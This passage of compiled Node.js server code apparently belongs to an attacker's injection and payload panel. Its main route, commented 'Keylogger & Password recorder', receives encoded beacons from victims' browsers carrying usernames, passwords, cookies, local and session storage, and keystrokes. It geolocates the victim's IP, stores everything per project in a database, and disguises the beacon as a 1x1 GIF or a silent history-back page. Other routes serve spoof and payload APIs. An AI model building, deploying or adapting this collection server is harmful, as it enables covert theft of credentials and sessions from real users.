            try {
                var ip = JSON.parse(atob(token)).ip;
                if (ip) {
                    /**
                     * Correctly parsed token
                     */
                    var realIP = void 0;
                    try {
                        realIP = req.headers['x-forwarded-for'].split(',')[0];
                    }
                    catch (e) {
                        realIP = getIP_js_1["default"](req.connection.remoteAddress);
                    }
                    if (realIP !== ip) {
                        /**
                         * Token validation failed, either forged or users IP changed
                         */
                        token = generateToken(req);
                        res.cookie('token', token);
                    }
                    /**
                     * Token validation complete, time to add them to the project
                     */
                    if (inject.authenticate[id]) {
                        inject.authenticate[id](token, req);
                        delete inject.authenticate[id];
                    }
                    else {
                        if (config.verbose) {
                            console.log(chalk.redBright('[inject:auth] ') +
                                chalk.yellowBright('failed to authenticate client, failed to locate inject.authenticate["' + id + '"]'));
                        }
                    }
                }
            }
            catch (e) {
                //
            }
        };
        if (req.query) {
            /**
             * Authentication
             */
            if (req.query.id) {
                /**
                 * Client wants to directly authenticate with token
                 */
                if (req.query.token) {
                    authenticate(req, res, req.query.token);
                }
                else {
                    if (req.cookies && req.cookies.token) {
                        /**
                         * Authenticate with user specified token
                         */
                        authenticate(req, res, req.cookies.token);
                    }
                    else {
                        /**
                         * Generate a new token
                         */
                        var token = generateToken(req);
                        res.cookie('token', token);
                        authenticate(req, res, token);
                    }
                    //
                    res.send(req.cookies);
                }
            }
            else {
                if (config.verbose) {
                    console.log(chalk.redBright('[inject:auth] ') +
                        chalk.yellowBright('failed to authenticate client, missing ID in query'));
                }
            }
        }
        else {
            if (config.verbose) {
                console.log(chalk.redBright('[inject:auth] ') +
                    chalk.yellowBright('failed to authenticate client, missing URL query'));
            }
        }
    });
    /**
     * Keylogger & Password recorder
     */
    app.get('/r/*', function (req, res) {
        var headers = req.headers;
        if (req.headers['forwarded-headers']) {
            // Attempt to extract forwarded headers
            try {
                headers = JSON.parse(decodeURIComponent(req.headers['forwarded-headers']));
                var key;
                var keys = Object.keys(headers);
                var n = keys.length;
                var newobj = {};
                while (n--) {
                    key = keys[n];
                    newobj[key.toLowerCase()] = headers[key];
                }
                headers = newobj;
            }
            catch (e) {
                // Failed to parse JSON from forwarded headers => likely malicious
            }
        }
        var validate = function (base64) {
            return new Promise(function (resolve, reject) {
                if (typeof base64 === 'string') {
                    try {
                        var json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()));
                        if (json)
                            resolve(json);
                    }
                    catch (e) {
                        reject(Error('invalid base64 encoded json string (' + e + ')'));
                    }
                }
                else {
                    reject(Error('empty request path'));
                }
            });
        };
        var Record = function (record) {
            return new Promise(function (resolve, reject) {
                var project = 'a';
                var type = 't';
                var username = 'b';
                var identifier = 'b';
                var password = 'c';
                var keys = 'c';
                var url = 'd';
                var width = 'e';
                var height = 'f';
                var localStorage = 'g';
                var sessionStorage = 'h';
                var cookies = 'i';
                var title = 'j';
                if (record[project]) {
                    db.collection('projects', function (err, projects) {
                        if (err)
                            throw err;
                        projects.findOne({
                            name: record[project]
                        }).then(function (doc) {
                            if (doc !== null) {
                                if (req.header('Referer') && doc.config.filter.domains.length > 0) {
                                    var referer_1 = new URL(req.header('Referer'));
                                    var allowed_1 = true;
                                    if (doc.config.filter.type.toLowerCase() === 'whitelist')
                                        allowed_1 = false;
                                    doc.config.filter.domains.forEach(function (domain) {
                                        if (domain.enabled === false)
                                            return;
                                        try {
                                            domain = new URL(domain.match);
                                        }
                                        catch (e) {
                                            return;
                                        }
                                        if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                                            // Whitelist
                                            if (domain.host === referer_1.host)
                                                allowed_1 = true;
                                        }
                                        else {
                                            // Blacklist
                                            if (domain.host === referer_1.host)
                                                allowed_1 = false;
                                        }
                                    });
                                    if (!allowed_1) {
                                        if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                                            reject("domain hasn't been whitelisted, not recording");
                                        }
                                        else {
                                            reject('domain has been blacklisted, not recording');
                                        }
                                        return;
                                    }
                                }
                                var ip;
                                try {
                                    ip = headers['x-forwarded-for'].split(',')[0];
                                }
                                catch (e) {
                                    ip = getIP_js_1["default"](req.connection.remoteAddress);
                                }
                                request({
                                    url: 'http://ip-api.com/json/' + ip,
                                    method: 'GET',
                                    headers: {
                                        'Accept': 'application/json'
                                    }
                                }, function (error, response, parsedIP) {
                                    if (error)
                                        throw error;
                                    try {
                                        ip = JSON.parse(parsedIP);
                                    }
                                    catch (e) {
                                    }
                                    if (record[type] === 0) {
                                        // Password logger
                                        var c = {};
                                        try {
                                            if (record[cookies]) {
                                                var pairs = record[cookies].split(';');
                                                for (var i = 0; i < pairs.length; i++) {
                                                    var pair = pairs[i].split('=');
                                                    c[pair[0]] = unescape(pair[1]);
                                                }
                                            }
                                            else {
                                                c = record[cookies];
                                            }
                                        }
                                        catch (e) {
                                            // throw(e)
                                            c = record[cookies];
                                        }
                                        projects.updateOne({
                                            name: record[project]
                                        }, {
                                            $push: {
                                                passwords: {
                                                    timestamp: new Date(),
                                                    username: record[username],
                                                    password: record[password],
                                                    url: {
                                                        title: record[title],
                                                        href: record[url]
                                                    },
                                                    ip: ip,
                                                    browser: {
                                                        width: record[width],
                                                        height: record[height],
                                                        'user-agent': parseAgent(headers['user-agent']),
                                                        headers: me(headers)
                                                    },
                                                    storage: {
                                                        local: me(record[localStorage]),
                                                        session: me(record[sessionStorage]),
                                                        cookies: me(c)
                                                    }
                                                }
                                            }
                                        }).then(function () {
                                            if (config.debug) {
                                                console.log(chalk.greenBright('[Record] ') +
                                                    chalk.yellowBright('recorded login ') +
                                                    chalk.magentaBright(record[username]) +
                                                    chalk.yellowBright(':') +
                                                    chalk.magentaBright(record[password]) +
                                                    chalk.yellowBright(' for project ') +
                                                    chalk.cyanBright(record[project]));
                                            }
                                            resolve('wrote record to database');
                                        });
                                    }
                                    else if (record[type] === 1) {
                                        // Keylogger
                                        var timestamp_1 = new Date();
                                        try {
                                            timestamp_1 = new Date(record[identifier]);
                                        }
                                        catch (e) { }
                                        // If the length is greater than 10,
                                        if (record[keys]) {
                                            var keystrokes_1 = [];
                                            try {
                                                for (i = 0; i < record[keys].length; i++) {
                                                    var key_1 = record[keys][i];
                                                    var keytype = 'keydown';
                                                    if (key_1.endsWith('_') && key_1.length !== 1) {
                                                        key_1 = key_1.slice(0, -1);
                                                        keytype = 'keyup';
                                                    }
                                                    var keyname = key_1;
                                                    if (keyname && keytype) {
                                                        keystrokes_1.push('[' + keytype + ' ' + keyname + ']');
                                                    }
                                                    else {
                                                        reject('invalid keylogger keycode');
                                                        break;
                                                    }
                                                }
                                            }
                                            catch (e) {
                                                reject('failed to parse keylogger array');
                                                throw e;
                                            }
                                            projects.updateOne({
                                                'name': record[project],
                                                'keylogger.timestamp': timestamp_1
                                            }, {
                                                $pushAll: {
                                                    'keylogger.$.keys': keystrokes_1
                                                }
                                            }).then(function (e) {
                                                if (e.result.nModified === 0) {
                                                    // Add new keylogger record
                                                    projects.updateOne({
                                                        name: record[project]
                                                    }, {
                                                        $push: {
                                                            keylogger: {
                                                                timestamp: timestamp_1,
                                                                ip: ip,
                                                                url: {
                                                                    title: record[title],
                                                                    href: record[url]
                                                                },
                                                                browser: {
                                                                    headers: me(headers),
                                                                    'user-agent': parseAgent(headers['user-agent'])
                                                                },
                                                                keys: keystrokes_1
                                                            }
                                                        }
                                                    }).then(function () {
                                                        resolve('wrote record to database');
                                                    });
                                                }
                                                else {
                                                    resolve('wrote log to database');
                                                }
                                            });
                                        }
                                        else {
                                            reject('keylogger value(s) not specified');
                                        }
                                    }
                                    else {
                                        reject('invalid / missing record type');
                                    }
                                });
                            }
                            else {
                                reject('project ' + record[project] + " doesn't exist");
                            }
                        });
                    });
                }
            });
        };
        var path;
        if (req.path.slice(-1) === '$') {
            // CORS bypass option enabled
            path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1);
            res.set('Content-Type', 'text/html')
                .send('<script>window.history.back()</script>');
        }
        else {
            path = req.path.substring(1).split(/\/(.+)?/, 2)[1];
            // Send a 1x1px gif
            var data = [
                0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b
            ];
            res
                .set('Content-Type', 'image/gif')
                .set('Content-Length', data.length)
                .status(200)
                .send(Buffer.from(data));
        }
        validate(path).then(function (record) {
            Record(record).then(function (message) {
                if (config.debug) {
                    console.log(chalk.greenBright('[record] ') +
                        chalk.yellowBright(message));
                }
            })["catch"](function (error) {
                if (config.debug) {
                    console.log(chalk.redBright('[record] ') +
                        chalk.yellowBright(error));
                }
            });
        })["catch"](function (error) {
            if (config.debug)
                console.log(chalk.redBright('[record] ') + chalk.yellowBright(error));
        });
    });
    /**
     * APIs
     */
    app.get('/api/spoof/*', apiLimiter, function (req, res) { return api.spoof(req, res); });
    app.get('/api/payload/*', apiLimiter, function (req, res) { return api.payload(req, res); });
    app.get('/api/*', apiLimiter, function (req, res) { return api.json(req, res); });
    if (config.dev) {
        // Proxy through to webpack-dev-server if in development mode
        app.use('/projects/*', function (req, res) {
            if (req.originalUrl.includes('.hot-update.js')) {
                var hotUpdate = req.originalUrl.split('/');
                hotUpdate = hotUpdate[hotUpdate.length - 1];
                request('http://localhost:8080/' + hotUpdate).pipe(res);
                return;
            }
            if (req.originalUrl.includes('/vs/')) {
                var vs = req.originalUrl.split('/vs/');
                vs = vs[vs.length - 1];
                request('http://localhost:8080/vs/' + vs).pipe(res);
                return;
            }
            request('http://localhost:8080' + req.originalUrl.substring(9), function (error, response) {
                if (error)
                    throw error;
                if (response.statusCode === 404) {
                    request('http://localhost:8080/').pipe(res);
                }
                else {
                    request('http://localhost:8080' + req.originalUrl.substring(9)).pipe(res);
                }
            });
        });
        app.use('/*', function (req, res) {
            if (req.url.substr(0, 9) === '/cdn-cgi/')
                return;
            if (req.originalUrl === '/config')
                req.originalUrl = '/';
            request('http://localhost:8080' + req.originalUrl).pipe(res);
        });
    }
    else {
        app.use('/projects/*', function (req, res) {
            if (req.originalUrl.includes('/vs/')) {
                var vs = req.originalUrl.split('/vs/');
                vs = '../interface/vs/' + path.normalize(vs[vs.length - 1]);
                if (fs.existsSync(vs)) {
                    res.sendFile(path.join(__dirname, vs));
                }
                else {
                    res.status(404).send('Not found');
                }
            }
            else {
                res.sendFile(path.join(__dirname, '../interface/index.html'));
            }
        });
        app.use('/config', function (req, res) {
            res.sendFile(path.join(__dirname, '../interface/index.html'));
        });
        app.use(express.static(path.join(__dirname, '../interface')));
    }
});
